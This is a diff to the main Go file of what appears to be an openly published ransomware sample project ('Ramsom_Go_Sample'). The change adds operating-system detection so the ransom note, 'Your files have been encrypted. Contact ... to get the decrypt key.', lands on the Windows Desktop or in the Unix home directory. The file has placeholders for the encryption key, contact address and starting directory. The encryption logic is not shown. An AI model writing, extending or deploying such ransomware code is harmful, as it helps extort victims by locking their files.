@@ -8,11 +8,13 @@ import (
 	"io"
 	"io/ioutil"
 	"os"
+	"runtime"
 
 	"github.com/schecthellraiser606/Ramsom_Go_Sample/explorer"
 )
 
 func main() {
+	var rootmain string
 	cryptoKey := "" // Insert generated Key
 	contact := "example606.com"   // Insert contact email
 	dir := ""       // Insert starting directory
@@ -47,7 +49,13 @@ func main() {
 
 	msg := "Your files have been encrypted.\nContact " + contact + " to get the decrypt key."
 
-	err = ioutil.WriteFile(os.Getenv("HOME")+dir+"/readme.txt", []byte(msg), 0644)
+	if runtime.GOOS == "windows" {
+		rootmain = os.Getenv("USERPROFILE")
+		err = ioutil.WriteFile(rootmain+"/Desktop/readme.txt", []byte(msg), 0644)
+	} else {
+		rootmain = os.Getenv("HOME")
+		err = ioutil.WriteFile(rootmain+"/readme.txt", []byte(msg), 0644)
+	}
 
 	if err != nil {
 		panic(err)
